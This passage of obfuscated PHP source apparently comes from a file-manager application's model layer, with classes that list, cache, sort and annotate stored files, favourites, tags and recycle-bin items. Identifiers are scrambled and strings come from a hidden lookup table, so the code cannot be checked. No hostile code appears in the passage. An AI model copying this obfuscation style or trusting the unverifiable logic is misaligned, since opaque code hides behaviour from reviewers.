$æÑé°›õ[$Ö†Øç©]; $¥’·şí = self::textEncode($¥’·şí); if ($¥’·şí === $Ï‡€ĞÁ²) { continue; } $É¹ô¥ç[] = array($ñ¦öĞ©‹[95], $Ö†Øç©, $ñ¦öĞ©‹[451], $Ï‡€ĞÁ², $ñ¦öĞ©‹[88], time()); } else { $¡´úÍÅå = array($ñ¦öĞ©‹[33] => $ë•‡°İ¼, $ñ¦öĞ©‹[95] => $Ö†Øç©, $ñ¦öĞ©‹[451] => $Ï‡€ĞÁ²); $µ–Å‡ëò[] = $this->filterWhere($¡´úÍÅå); } } if (!$µ–Å‡ëò && !$É¹ô¥ç) { return !0; } $this->cacheRemove($ë•‡°İ¼); $òÑáÀ˜Ç = $this->cacheKey($ñ¦öĞ©‹[491]); CacheLock::lock($òÑáÀ˜Ç); if ($µ–Å‡ëò) { $this->addAll($µ–Å‡ëò); } if ($É¹ô¥ç) { $this->saveAll($É¹ô¥ç, $ò¾‹È¶¯); } CacheLock::unlock($òÑáÀ˜Ç); return !0; } protected function optionDefault($·õ…™®˜ = '') { return !1; } public function setDeep($ºåŞ”Ñ¡, $€Ü¹Ö­° = false, $…´ã¦¤º = '') { $à×€×¢® = explode($_SERVER[ïÃ°£«Ê][10], $ºåŞ”Ñ¡); $’§ˆ˜Ë¬ = $this->get(); array_set_value($’§ˆ˜Ë¬, $ºåŞ”Ñ¡, $€Ü¹Ö­°); $this->set($à×€×¢®[0], $’§ˆ˜Ë¬[$à×€×¢®[0]], $…´ã¦¤º); } public function remove($âì³†ş†, $ØŞ’Ş¸½ = '') { $ñ ğæŞ§ =& $_SERVER[ïÃ°£«Ê]; $this->cacheRemove($ØŞ’Ş¸½); $ŸÇÒÉóõ = $this->filterWhere(array($ñ ğæŞ§[95] => $âì³†ş†, $ñ ğæŞ§[33] => $ØŞ’Ş¸½)); if (is_null($âì³†ş†)) { unset($ŸÇÒÉóõ[$ñ ğæŞ§[95]]); } return $this->where($ŸÇÒÉóõ)->delete(); } public function removeArr($Ş¼§¨Û, $ù•Û³†° = '') { $Í¿ãäİŸ =& $_SERVER[ïÃ°£«Ê]; if (!$Ş¼§¨Û || !is_array($Ş¼§¨Û)) { return !0; } $this->cacheRemove($ù•Û³†°); $ˆäûÒ…¦ = $this->filterWhere(array($Í¿ãäİŸ[33] => $ù•Û³†°, $Í¿ãäİŸ[95] => array($Í¿ãäİŸ[7], $Ş¼§¨Û))); return $this->where($ˆäûÒ…¦)->delete(); } public function cacheSet($Óé‰‚ï, $ÏêÛˆøÀ = false) { return Cache::set($this->cacheKey($Óé‰‚ï), $ÏêÛˆøÀ); } public function cacheGet($éìøÓ´) { return Cache::get($this->cacheKey($éìøÓ´)); } public function cacheRemove($èËÙãÃ­) { return Cache::remove($this->cacheKey($èËÙãÃ­)); } protected function filterWhere($ÃÁŞü») { return $ÃÁŞü»; } protected function cacheKey($‹˜™¤¯) { return $‹˜™¤¯; } } class SourceListModel extends ModelBase { protected $tableName = "\151\x6f\x5f\x73\157\165\162\x63\x65"; protected $tableMeta = array("\x74\x61\x62\154\145\x4e\x61\155\x65" => "\x69\x6f\137\x73\157\165\162\143\x65\137\x6d\x65\x74\141", "\x6d\x65\x74\141\106\151\145\x6c\144" => "\163\x6f\x75\162\143\145\x49\x44"); protected $dataAuto = array(array("\155\157\x64\x69\x66\x79\124\x69\x6d\145", "\164\x69\x6d\145", "\x69\x6e\163\145\162\164", "\x66\x75\x6e\x63\x74\151\x6f\156"), array("\x63\162\x65\141\x74\145\x54\x69\x6d\x65", "\x74\151\155\x65", "\x69\x6e\x73\145\162\x74", "\x66\165\156\x63\164\151\x6f\x6e"), array("\x76\151\x65\167\124\x69\155\145", "\x74\x69\x6d\145", "\151\x6e\x73\x65\162\x74", "\146\165\x6e\143\x74\151\x6f\x6e")); protected static $cacheSourceInfo = array(); protected static $cachePathInfo = array(); protected static $cacheFileInfo = array(); protected static $cacheChildList = array(); const TYPE_SYSTEM = 0; const TYPE_USER = 1; const TYPE_GROUP = 2; public function listData($×Åº½×ˆ) { return $this->listSource(array($_SERVER[ïÃ°£«Ê][492] => $×Åº½×ˆ)); } public function typeName($ÔŠÉÖÁ©) { static $²®æÀî = array(self::TYPE_SYSTEM => "\x73\171\163\x74\x65\x6d", self::TYPE_USER => "\165\x73\145\162", self::TYPE_GROUP => "\147\162\x6f\x75\160"); return $²®æÀî[$ÔŠÉÖÁ© . $_SERVER[ïÃ°£«Ê][12]]; } public function sourceListInfo($„£ƒ‚ŸŒ, $±÷ûøıè = false) { $ˆİÈò =& $_SERVER[ïÃ°£«Ê]; $„£ƒ‚ŸŒ = $„£ƒ‚ŸŒ ? $„£ƒ‚ŸŒ : array(); $„£ƒ‚ŸŒ = array_filter(array_unique($„£ƒ‚ŸŒ)); if (!$„£ƒ‚ŸŒ) { return array(); } $’¦³ç¢Ÿ = $this->where(array($ˆİÈò[191] => array($ˆİÈò[7], $„£ƒ‚ŸŒ)))->select(); $this->_listDataApply($’¦³ç¢Ÿ, $±÷ûøıè); return array_to_keyvalue($’¦³ç¢Ÿ, $ˆİÈò[191]); } public function pathInfoFilter(&$¸¦¥ÀÑ) { $“Û’ÈÛ± =& $_SERVER[ïÃ°£«Ê]; static $¢ğÜÙëÚ = false; static $òÈ·›à„ = false; static $ŸøŠÔ‹Ã = false; if (!$¢ğÜÙëÚ) { $èÇúË›ä = $“Û’ÈÛ±[493]; $èÇúË›ä .= $“Û’ÈÛ±[494]; $èÇúË›ä .= $“Û’ÈÛ±[495]; $¡¶ùÔè° = $“Û’ÈÛ±[496]; $øşÀ«ù“ = explode($“Û’ÈÛ±[50], $¡¶ùÔè°); $¢ğÜÙëÚ = explode($“Û’ÈÛ±[50], $èÇúË›ä); $òÈ·›à„ = array(); foreach ($¢ğÜÙëÚ as $³ôÛ¯ù) { if (in_array($³ôÛ¯ù, $øşÀ«ù“)) { continue; } $òÈ·›à„[] = $³ôÛ¯ù; } $ŸøŠÔ‹Ã = explode($“Û’ÈÛ±[50], $“Û’ÈÛ±[497]); } foreach ($ŸøŠÔ‹Ã as $€×¸ÃÚ±) { if (isset($¸¦¥ÀÑ[$€×¸ÃÚ±])) { $¸¦¥ÀÑ[$€×¸ÃÚ±] = intval($¸¦¥ÀÑ[$€×¸ÃÚ±]); } } $¸¦¥ÀÑ[$“Û’ÈÛ±[87]] = $“Û’ÈÛ±[498] . $¸¦¥ÀÑ[$“Û’ÈÛ±[191]] . $“Û’ÈÛ±[499]; $¸¦¥ÀÑ[$“Û’ÈÛ±[33]] = $¸¦¥ÀÑ[$“Û’ÈÛ±[500]] == 1 ? $“Û’ÈÛ±[78] : $“Û’ÈÛ±[230]; $¸¦¥ÀÑ[$“Û’ÈÛ±[188]] = $this->typeName($¸¦¥ÀÑ[$“Û’ÈÛ±[188]]); if ($¸¦¥ÀÑ[$“Û’ÈÛ±[500]] != 1) { $¸¦¥ÀÑ[$“Û’ÈÛ±[166]] = $¸¦¥ÀÑ[$“Û’ÈÛ±[501]]; unset($¸¦¥ÀÑ[$“Û’ÈÛ±[501]]); } $ï¬õı… = $¢ğÜÙëÚ; if (isset($¸¦¥ÀÑ[$“Û’ÈÛ±[502]]) && $¸¦¥ÀÑ[$“Û’ÈÛ±[502]][$“Û’ÈÛ±[503]] == -1) { $ï¬õı… = $òÈ·›à„; } $¸¦¥ÀÑ = array_field_key($¸¦¥ÀÑ, $ï¬õı…); return $¸¦¥ÀÑ; } public function listUserFav() { $ô‹¸¿¤  =& $_SERVER[ïÃ°£«Ê]; $Í¾ç¤·‚ = Model($ô‹¸¿¤ [504])->listData(); $äÔÁúÔ¯ = array_filter_by_field($Í¾ç¤·‚, $ô‹¸¿¤ [33], $ô‹¸¿¤ [505]); $äÔÁúÔ¯ = array_to_keyvalue($äÔÁúÔ¯, $ô‹¸¿¤ [12], $ô‹¸¿¤ [87]); if ($äÔÁúÔ¯) { $õÒê³¢ä = $this->listSource(array($ô‹¸¿¤ [506] => array($ô‹¸¿¤ [507], $äÔÁúÔ¯))); } $õÒê³¢ä = array_to_keyvalue($õÒê³¢ä[$ô‹¸¿¤ [446]], $ô‹¸¿¤ [191]); foreach ($Í¾ç¤·‚ as &$‡ÎîÅ¾•) { $‡ÎîÅ¾• = array($ô‹¸¿¤ [508] => $‡ÎîÅ¾•[$ô‹¸¿¤ [487]], $ô‹¸¿¤ [509] => $‡ÎîÅ¾•[$ô‹¸¿¤ [32]], $ô‹¸¿¤ [510] => $‡ÎîÅ¾•[$ô‹¸¿¤ [87]], $ô‹¸¿¤ [511] => $‡ÎîÅ¾•[$ô‹¸¿¤ [33]], $ô‹¸¿¤ [512] => $‡ÎîÅ¾•[$ô‹¸¿¤ [231]], $ô‹¸¿¤ [513] => $‡ÎîÅ¾•[$ô‹¸¿¤ [88]]); if ($‡ÎîÅ¾•[$ô‹¸¿¤ [33]] == $ô‹¸¿¤ [505] && $õÒê³¢ä[$‡ÎîÅ¾•[$ô‹¸¿¤ [87]]]) { $‡ÎîÅ¾•[$ô‹¸¿¤ [90]] = $õÒê³¢ä[$‡ÎîÅ¾•[$ô‹¸¿¤ [87]]]; } } unset($‡ÎîÅ¾•); return $Í¾ç¤·‚; } public function listUserTag($¢ù¼›İÔ) { $¬Ê™ƒŠÖ =& $_SERVER[ïÃ°£«Ê]; if ($¢ù¼›İÔ && !is_array($¢ù¼›İÔ)) { $¢ù¼›İÔ = array($¢ù¼›İÔ); } $ÍØñöšå = Model($¬Ê™ƒŠÖ[514])->listData(); $›”À®ò÷ = array(); $ì¡ß«Æ® = array(); foreach ($ÍØñöšå as $Á±ŸÜ†û) { $®ÚÚµ×¶ = $Á±ŸÜ†û[$¬Ê™ƒŠÖ[87]]; if (!$®ÚÚµ×¶) { continue; } if (!isset($ì¡ß«Æ®[$®ÚÚµ×¶])) { $ì¡ß«Æ®[$®ÚÚµ×¶] = array(); } $ì¡ß«Æ®[$®ÚÚµ×¶][] = $Á±ŸÜ†û[$¬Ê™ƒŠÖ[515]]; $›”À®ò÷[$Á±ŸÜ†û[$¬Ê™ƒŠÖ[87]]] = $Á±ŸÜ†û; } $â¥ªşÑ¢ = array(); $ À‚ÑÕÂ = array(); $¯µ¼Ì² = array(); foreach ($ì¡ß«Æ® as $Û¾Õòî¦ => $Ì¾Êª„É) { $»™–§Ş¯ = !0; if (!$¢ù¼›İÔ) { $â¥ªşÑ¢[] = $Û¾Õòî¦; continue; } foreach ($¢ù¼›İÔ as $âÅÉ«¦Ê) { if (!in_array($âÅÉ«¦Ê, $Ì¾Êª„É)) { $»™–§Ş¯ = !1; break; } } if (!$»™–§Ş¯) { continue; } if (!is_numeric($Û¾Õòî¦)) { $çå˜Ö«¹ = $›”À®ò÷[$Û¾Õòî¦]; $Œ“Š®êÙ = array($¬Ê™ƒŠÖ[32] => $çå˜Ö«¹[$¬Ê™ƒŠÖ[32]], $¬Ê™ƒŠÖ[87] => $çå˜Ö«¹[$¬Ê™ƒŠÖ[87]], $¬Ê™ƒŠÖ[33] => $çå˜Ö«¹[$¬Ê™ƒŠÖ[33]], $¬Ê™ƒŠÖ[90] => array($¬Ê™ƒŠÖ[516] => 1), $¬Ê™ƒŠÖ[232] => !0); if ($çå˜Ö«¹[$¬Ê™ƒŠÖ[33]] == $¬Ê™ƒŠÖ[230]) { $¯µ¼Ì²[] = $Œ“Š®êÙ; } if ($çå˜Ö«¹[$¬Ê™ƒŠÖ[33]] == $¬Ê™ƒŠÖ[78]) { $ À‚ÑÕÂ[] = $Œ“Š®êÙ; } continue; } $â¥ªşÑ¢[] = $Û¾Õòî¦; } if ($â¥ªşÑ¢) { $àéğÌ§ = $this->listSource(array($¬Ê™ƒŠÖ[506] => array($¬Ê™ƒŠÖ[507], $â¥ªşÑ¢))); } $àéğÌ§ = $àéğÌ§ ? $àéğÌ§ : array($¬Ê™ƒŠÖ[85] => array(), $¬Ê™ƒŠÖ[86] => array()); $àéğÌ§[$¬Ê™ƒŠÖ[85]] = array_merge($àéğÌ§[$¬Ê™ƒŠÖ[85]], $ À‚ÑÕÂ); $àéğÌ§[$¬Ê™ƒŠÖ[86]] = array_merge($àéğÌ§[$¬Ê™ƒŠÖ[86]], $¯µ¼Ì²); if (isset($àéğÌ§[$¬Ê™ƒŠÖ[443]]) && count($â¥ªşÑ¢) == $àéğÌ§[$¬Ê™ƒŠÖ[443]][$¬Ê™ƒŠÖ[444]]) { return $àéğÌ§; } $¾‡âÃ‡Ú = array(); $ûœ„°Ä· = array_to_keyvalue($àéğÌ§[$¬Ê™ƒŠÖ[85]], $¬Ê™ƒŠÖ[12], $¬Ê™ƒŠÖ[191]); $Øê——ãä = array_to_keyvalue($àéğÌ§[$¬Ê™ƒŠÖ[86]], $¬Ê™ƒŠÖ[12], $¬Ê™ƒŠÖ[191]); $Ğçù—öÉ = array_merge($Øê——ãä, $ûœ„°Ä·); foreach ($â¥ªşÑ¢ as $®ÚÚµ×¶) { if (!in_array($®ÚÚµ×¶, $Ğçù—öÉ)) { $¾‡âÃ‡Ú[] = $®ÚÚµ×¶; } } if ($¾‡âÃ‡Ú) { Model($¬Ê™ƒŠÖ[517])->removeBySource($¾‡âÃ‡Ú); } return $àéğÌ§; } public function listUserRecycle() { $¤Àá²º§ =& $_SERVER[ïÃ°£«Ê]; $ÙÈ¶ú‚ = Model($¤Àá²º§[518])->listData(); if (!$ÙÈ¶ú‚) { return array(); } $¥‘‹æäº = array($¤Àá²º§[506] => array($¤Àá²º§[507], $ÙÈ¶ú‚), $¤Àá²º§[519] => 1); return $this->listSource($¥‘‹æäº); } public function listSource($Èñ›âÅ, $ÆØÉÍ» = 3000, $‘¡©ßá– = false) { $ÜÍÏ´éÈ =& $_SERVER[ïÃ°£«Ê]; if (!isset($Èñ›âÅ[$ÜÍÏ´éÈ[520]])) { $Èñ›âÅ[$ÜÍÏ´éÈ[520]] = 0; } if (isset($Èñ›âÅ[$ÜÍÏ´éÈ[190]]) && $Èñ›âÅ[$ÜÍÏ´éÈ[190]] == $ÜÍÏ´éÈ[228]) { $Èñ›âÅ[$ÜÍÏ´éÈ[501]] = array($ÜÍÏ´éÈ[464], $ÜÍÏ´éÈ[12]); } if (isset($Èñ›âÅ[$ÜÍÏ´éÈ[190]])) { $Èñ›âÅ[$ÜÍÏ´éÈ[190]] = intval($Èñ›âÅ[$ÜÍÏ´éÈ[190]]); } $Şâàƒ¶ = $ÜÍÏ´éÈ[521]; $€ß†Ÿ€ = $this->field($Şâàƒ¶)->_makeOrder()->where($Èñ›âÅ)->selectPage($ÆØÉÍ»); $this->_listPageCheck($€ß†Ÿ€, $Şâàƒ¶, $Èñ›âÅ); $this->_listDataApply($€ß†Ÿ€[$ÜÍÏ´éÈ[446]], $‘¡©ßá–); $this->_listMake($€ß†Ÿ€); return $€ß†Ÿ€; } private function _listPageCheck(&$Šå–¡±É, $™çáúå, $¾İºÆ‡›) { $„¯“½‡ı =& $_SERVER[ïÃ°£«Ê]; if (!is_array($Šå–¡±É[$„¯“½‡ı[443]])) { return; } $€÷×˜’ = $Šå–¡±É[$„¯“½‡ı[443]]; if ($€÷×˜’[$„¯“½‡ı[445]] <= 1) { return; } if ($€÷×˜’[$„¯“½‡ı[444]] >= 100000) { return; } if (Model($„¯“½‡ı[522])->get($„¯“½‡ı[523]) != $„¯“½‡ı[524]) { return; } $™çáúå = str_replace(array($„¯“½‡ı[53], $„¯“½‡ı[417], $„¯“½‡ı[285]), $„¯“½‡ı[12], $™çáúå); $™çáúå = $„¯“½‡ı[525] . str_replace($„¯“½‡ı[50], $„¯“½‡ı[526], $™çáúå) . $„¯“½‡ı[527]; $ÅµÖÍŒÚ = $„¯“½‡ı[528]; $ÅµÖÍŒÚ = $ÅµÖÍŒÚ . $„¯“½‡ı[529]; $—²íË = $€÷×˜’[$„¯“½‡ı[439]] * ($€÷×˜’[$„¯“½‡ı[428]] - 1) . $„¯“½‡ı[50] . $€÷×˜’[$„¯“½‡ı[439]]; $ÄéñÇ‡İ = $this->_makeOrder(!0); $Ñ«Üİş = $„¯“½‡ı[525] . str_replace($„¯“½‡ı[50], $„¯“½‡ı[526], $ÄéñÇ‡İ[0]); if (strpos($Ñ«Üİş, $„¯“½‡ı[530])) { $Ñ«Üİş = str_replace($„¯“½‡ı[530], $„¯“½‡ı[531], $Ñ«Üİş); } else { $Ñ«Üİş .= $„¯“½‡ı[532] . $ÄéñÇ‡İ[1]; } $˜ß§ËÍ = array(); foreach ($¾İºÆ‡› as $ÚÎù¾ => $‡º€âóÌ) { $˜ß§ËÍ[$„¯“½‡ı[525] . $ÚÎù¾] = $‡º€âóÌ; } $this->alias($„¯“½‡ı[533])->field($™çáúå)->limit($—²íË)->order($Ñ«Üİş); $–üÇê– = $this->join($ÅµÖÍŒÚ)->where($˜ß§ËÍ)->select(); if ($–üÇê–) { $Šå–¡±É[$„¯“½‡ı[446]] = $–üÇê–; } } protected function _makeOrder($«¤¦şá  = false) { $÷ÔçÍÑÇ =& $_SERVER[ïÃ°£«Ê]; $è²‚¥øÛ = Model($÷ÔçÍÑÇ[534])->get($÷ÔçÍÑÇ[535]); $ÚÚ’İ¥ø = Model($÷ÔçÍÑÇ[534])->get($÷ÔçÍÑÇ[536]); $Éêâ»òş = array($÷ÔçÍÑÇ[537] => $÷ÔçÍÑÇ[538], $÷ÔçÍÑÇ[539] => $÷ÔçÍÑÇ[540]); $Ç´ §æÇ = array($÷ÔçÍÑÇ[32] => $÷ÔçÍÑÇ[32], $÷ÔçÍÑÇ[79] => $÷ÔçÍÑÇ[79], $÷ÔçÍÑÇ[166] => $÷ÔçÍÑÇ[501], $÷ÔçÍÑÇ[541] => $÷ÔçÍÑÇ[541], $÷ÔçÍÑÇ[542] => $÷ÔçÍÑÇ[543], $÷ÔçÍÑÇ[231] => $÷ÔçÍÑÇ[231], $÷ÔçÍÑÇ[88] => $÷ÔçÍÑÇ[88]); $™ñ¿ñÉö = Input::get($÷ÔçÍÑÇ[544], $÷ÔçÍÑÇ[7], $è²‚¥øÛ, array_keys($Ç´ §æÇ)); $´‹ÁóŞ¹ = Input::get($÷ÔçÍÑÇ[545], $÷ÔçÍÑÇ[7], $ÚÚ’İ¥ø, array_keys($Éêâ»òş)); if (!in_array($™ñ¿ñÉö, array_keys($Ç´ §æÇ))) { $™ñ¿ñÉö = $÷ÔçÍÑÇ[32]; } if (!in_array($´‹ÁóŞ¹, array_keys($Éêâ»òş))) { $™ñ¿ñÉö = $÷ÔçÍÑÇ[537]; } if ($™ñ¿ñÉö == $÷ÔçÍÑÇ[32]) { } $’¨õÊÅ¾ = $÷ÔçÍÑÇ[546] . $Ç´ §æÇ[$™ñ¿ñÉö] . $÷ÔçÍÑÇ[53] . $Éêâ»òş[$´‹ÁóŞ¹]; $’¨õÊÅ¾ = rtrim(trim($’¨õÊÅ¾), $÷ÔçÍÑÇ[50]); if ($«¤¦şá ) { return array($’¨õÊÅ¾, $Éêâ»òş[$´‹ÁóŞ¹]); } return $this->order($’¨õÊÅ¾); } protected function _listDataApplyItem($˜ÔŸ—ç´, $´ù¡Ó•¾ = false) { $–’Ø£¼‰ = array($˜ÔŸ—ç´); $this->_listDataApply($–’Ø£¼‰, $´ù¡Ó•¾); return $–’Ø£¼‰[0]; } protected function _listDataApply(&$Òìª±Ç…, $Ãé¹çÊ‘ = false) { $ÆÈÎîèË =& $_SERVER[ïÃ°£«Ê]; if (!$Òìª±Ç…) { $Òìª±Ç… = array(); return; } $ î±ÛÌø = array_to_keyvalue($Òìª±Ç…, $ÆÈÎîèË[12], $ÆÈÎîèË[191]); $ î±ÛÌø = array_unique($ î±ÛÌø); $ î±ÛÌø = array_to_int($ î±ÛÌø); $this->_listSourceCache($Òìª±Ç…); if (!$Ãé¹çÊ‘) { $this->_listAppendMeta($Òìª±Ç…, $ î±ÛÌø); $this->_listAppendFileMeta($Òìª±Ç…, $ î±ÛÌø); $this->_listAppendChildren($Òìª±Ç…, $ î±ÛÌø); } $this->_listAppendPath($Òìª±Ç…); $this->_listAppendAuth($Òìª±Ç…); $this->_listAppendSourceInfo($Òìª±Ç…, $ î±ÛÌø); $this->_listAppendUser($Òìª±Ç…); $this->_listFilterInfo($Òìª±Ç…, $Ãé¹çÊ‘); $this->_listAppendAuthSecret($Òìª±Ç…); } protected function _listSourceCache($ øµ®ü—) { $Ùİìáô« =& $_SERVER[ïÃ°£«Ê]; foreach ($ øµ®ü— as $•şÌ×¾ó) { self::$cacheSourceInfo[$Ùİìáô«[547] . $•şÌ×¾ó[$Ùİìáô«[191]]] = $•şÌ×¾ó; } } protected function _listFilterInfo(&$ó¸ŒÑñà, $êÖ•Ïã = false) { $Àë¢’ =& $_SERVER[ïÃ°£«Ê]; foreach ($ó¸ŒÑñà as &$°ÖË¹Äî) { $°ÖË¹Äî = $this->pathInfoFilter($°ÖË¹Äî); self::$cachePathInfo[$Àë¢’[548] . intval($êÖ•Ïã) . $Àë¢’[476] . $°ÖË¹Äî[$Àë¢’[191]]] = $°ÖË¹Äî; } unset($°ÖË¹Äî); } protected function _listMake(&$ƒÖ¤‡Ø“) { $ÇÖüÉ«Â =& $_SERVER[ïÃ°£«Ê]; $ƒÖ¤‡Ø“[$ÇÖüÉ«Â[85]] = array(); $ƒÖ¤‡Ø“[$ÇÖüÉ«Â[86]] = array(); foreach ($ƒÖ¤‡Ø“[$ÇÖüÉ«Â[446]] as $ïª†ì¸ƒ) { $Ù‚†Ñ€ = $ïª†ì¸ƒ[$ÇÖüÉ«Â[500]] == 1 ? $ÇÖüÉ«Â[85] : $ÇÖüÉ«Â[86]; $ƒÖ¤‡Ø“[$Ù‚†Ñ€][] = $ïª†ì¸ƒ; } unset($ƒÖ¤‡Ø“[$ÇÖüÉ«Â[446]]); } protected function _listAppendMeta(&$àğşòá¾, $ª¥¡ïÂ’) { $‹Ú¡ıç =& $_SERVER[ïÃ°£«Ê]; $½°ÄÉ = array($‹Ú¡ıç[506] => array($‹Ú¡ıç[507], $ª¥¡ïÂ’)); $Ùª§Ç½ = Model($‹Ú¡ıç[549])->field($‹Ú¡ıç[550])->where($½°ÄÉ)->select(); if (!$Ùª§Ç½) { return; } $‚µıëñİ = array($‹Ú¡ıç[551], $‹Ú¡ıç[552], $‹Ú¡ıç[531]); $¯é°Ší¾ = array(); foreach ($Ùª§Ç½ as $ñ•´†Â) { if (!isset($¯é°Ší¾[$ñ•´†Â[$‹Ú¡ıç[191]]])) { $¯é°Ší¾[$ñ•´†Â[$‹Ú¡ıç[191]]] = array(); } if (in_array($ñ•´†Â[$‹Ú¡ıç[95]], $‚µıëñİ)) { continue; } if ($ñ•´†Â[$‹Ú¡ıç[95]] == $‹Ú¡ıç[553]) { $ñ•´†Â[$‹Ú¡ıç[451]] = $‹Ú¡ıç[554]; } $¯é°Ší¾[$ñ•´†Â[$‹Ú¡ıç[191]]][$ñ•´†Â[$‹Ú¡ıç[95]]] = $ñ•´†Â[$‹Ú¡ıç[451]]; } foreach ($àğşòá¾ as &$×¼§ãƒá) { $×¼§ãƒá[$‹Ú¡ıç[555]] = !1; if (isset($¯é°Ší¾[$×¼§ãƒá[$‹Ú¡ıç[191]]])) { $×¼§ãƒá[$‹Ú¡ıç[555]] = $¯é°Ší¾[$×¼§ãƒá[$‹Ú¡ıç[191]]]; } if ($this->fileIsLock($×¼§ãƒá) && $×¼§ãƒá[$‹Ú¡ıç[502]]) { $çÛ¢©¶Ø = AuthModel::AUTH_EDIT | AuthModel::AUTH_REMOVE; $×¼§ãƒá[$‹Ú¡ıç[502]][$‹Ú¡ıç[503]] = AuthModel::authDisable($×¼§ãƒá[$‹Ú¡ıç[502]][$‹Ú¡ıç[503]], $çÛ¢©¶Ø); $×¼§ãƒá[$‹Ú¡ıç[502]][$‹Ú¡ıç[556]][$‹Ú¡ıç[502]] = $×¼§ãƒá[$‹Ú¡ıç[502]][$‹Ú¡ıç[503]]; } } unset($×¼§ãƒá); } protected function _listAppendFileMeta(&$î óÌüÆ, $–ºÄÔ‡ë) { $İ¶˜Ş™€ =& $_SERVER[ïÃ°£«Ê]; $§¿ùôÏ¥ = array_to_keyvalue($î óÌüÆ, $İ¶˜Ş™€[12], $İ¶˜Ş™€[557]); $§¿ùôÏ¥ = array_filter(array_unique($§¿ùôÏ¥)); $§¿ùôÏ¥ = array_to_int($§¿ùôÏ¥); if (!$§¿ùôÏ¥) { return; } $Û³˜•÷ = array($İ¶˜Ş™€[558] => array($İ¶˜Ş™€[507], $§¿ùôÏ¥)); $öçÅœ‹¸ = $İ¶˜Ş™€[559]; $üøÖ–—î = Model($İ¶˜Ş™€[560])->field($öçÅœ‹¸)->where($Û³˜•÷)->select(); $üøÖ–—î = array_to_keyvalue($üøÖ–—î, $İ¶˜Ş™€[557]); $ò“”Š·© = Model($İ¶˜Ş™€[561])->field($İ¶˜Ş™€[562])->where($Û³˜•÷)->select(); $ò“”Š·© = $ò“”Š·© ? $ò“”Š·© : array(); $··Ü†–· = array(); foreach ($ò“”Š·© as $æ”·¥ïÓ) { if (!isset($··Ü†–·[$æ”·¥ïÓ[$İ¶˜Ş™€[557]]])) { $··Ü†–·[$æ”·¥ïÓ[$İ¶˜Ş™€[557]]] = array(); } $··Ü†–·[$æ”·¥ïÓ[$İ¶˜Ş™€[557]]][$æ”·¥ïÓ[$İ¶˜Ş™€[95]]] = $æ”·¥ïÓ[$İ¶˜Ş™€[451]]; } foreach ($î óÌüÆ as &$Í¹­™•‚) { $İ›»¯Û = $Í¹­™•‚[$İ¶˜Ş™€[557]]; if (!$İ›»¯Û || !is_array($üøÖ–—î[$İ›»¯Û])) { continue; } $™¯‰©° = $üøÖ–—î[$İ›»¯Û]; $™¯‰©°[$İ¶˜Ş™€[79]] = $Í¹­™•‚[$İ¶˜Ş™€[79]]; $™¯‰©°[$İ¶˜Ş™€[32]] = $Í¹­™•‚[$İ¶˜Ş™€[32]]; if (!$™¯‰©°[$İ¶˜Ş™€[563]]) { Model($İ¶˜Ş™€[560])->fileMd5Check($™¯‰©°); } if (!isset(self::$cacheFileInfo[$İ¶˜Ş™€[564] . $İ›»¯Û])) { self::$cacheFileInfo[$İ¶˜Ş™€[564] . $İ›»¯Û] = array_merge(array(), $™¯‰©°); } unset($üøÖ–—î[$İ›»¯Û][$İ¶˜Ş™€[87]]); $Î¿‡ò€± = isset($··Ü†–·[$İ›»¯Û]) && is_array($··Ü†–·[$İ›»¯Û]) ? $··Ü†–·[$İ›»¯Û] : array(); $Í¹­™•‚[$İ¶˜Ş™€[167]] = array_merge($Î¿‡ò€±, $üøÖ–—î[$İ›»¯Û]); if (isset($Í¹­™•‚[$İ¶˜Ş™€[167]][$İ¶˜Ş™€[182]])) { $Í¹­™•‚[$İ¶˜Ş™€[182]] = json_decode($Í¹­™•‚[$İ¶˜Ş™€[167]][$İ¶˜Ş™€[182]], !0); unset($Í¹­™•‚[$İ¶˜Ş™€[167]][$İ¶˜Ş™€[182]]); } } unset($Í¹­™•‚); } protected function _listAppendSourceInfo(&$ ÕÓşÓ, $šÒ·ñ‚) { $­Ì¨Ù®Æ =& $_SERVER[ïÃ°£«Ê]; $‰ÆÅ§ = Model($­Ì¨Ù®Æ[565])->listData(); $¦ù¯úñ¶ = Model($­Ì¨Ù®Æ[514])->listData(); $˜¾°îÒ® = Model($­Ì¨Ù®Æ[504])->listData(); $öÊºÆ÷Š = Model($­Ì¨Ù®Æ[566])->listSimple(); $´®“Ôø = array_to_keyvalue($‰ÆÅ§, $­Ì¨Ù®Æ[487]); $´Çûá‘Ø = array_to_keyvalue_group($¦ù¯úñ¶, $­Ì¨Ù®Æ[87], $­Ì¨Ù®Æ[515]); $ı“‡Ò„ = array_to_keyvalue($˜¾°îÒ®, $­Ì¨Ù®Æ[87]); $Æ•Ùô´ = array_to_keyvalue_group($öÊºÆ÷Š, $­Ì¨Ù®Æ[191]); foreach ($ ÕÓşÓ as &$Ïû“Ú´…) { $Ïû“Ú´…[$­Ì¨Ù®Æ[90]] = array($­Ì¨Ù®Æ[567] => 0, $­Ì¨Ù®Æ[568] => 0, $­Ì¨Ù®Æ[569] => 0); if (isset($ı“‡Ò„[$Ïû“Ú´…[$­Ì¨Ù®Æ[191]]])) { $Ïû“Ú´…[$­Ì¨Ù®Æ[90]][$­Ì¨Ù®Æ[570]] = 1; $Ïû“Ú´…[$­Ì¨Ù®Æ[90]][$­Ì¨Ù®Æ[571]] = $ı“‡Ò„[$Ïû“Ú´…[$­Ì¨Ù®Æ[191]]][$­Ì¨Ù®Æ[32]]; } if ($´Çûá‘Ø && $´®“Ôø && isset($´Çûá‘Ø[$Ïû“Ú´…[$­Ì¨Ù®Æ[191]]])) { $Ïû“Ú´…[$­Ì¨Ù®Æ[90]][$­Ì¨Ù®Æ[572]] = array(); foreach ($´Çûá‘Ø[$Ïû“Ú´…[$­Ì¨Ù®Æ[191]]] as $œÆ§÷) { $‘Ø÷ôºü = $´®“Ôø[$œÆ§÷]; $Ïû“Ú´…[$­Ì¨Ù®Æ[90]][$­Ì¨Ù®Æ[572]][] = array($­Ì¨Ù®Æ[573] => $‘Ø÷ôºü[$­Ì¨Ù®Æ[487]], $­Ì¨Ù®Æ[509] => $‘Ø÷ôºü[$­Ì¨Ù®Æ[32]], $­Ì¨Ù®Æ[574] => $‘Ø÷ôºü[$­Ì¨Ù®Æ[575]]); } } if ($Æ•Ùô´ && isset($Æ•Ùô´[$Ïû“Ú´…[$­Ì¨Ù®Æ[191]]])) { $Ïû“Ú´…[$­Ì¨Ù®Æ[90]][$­Ì¨Ù®Æ[576]] = array(); foreach ($Æ•Ùô´[$Ïû“Ú´…[$­Ì¨Ù®Æ[191]]] as $¹ÃÚïí) { 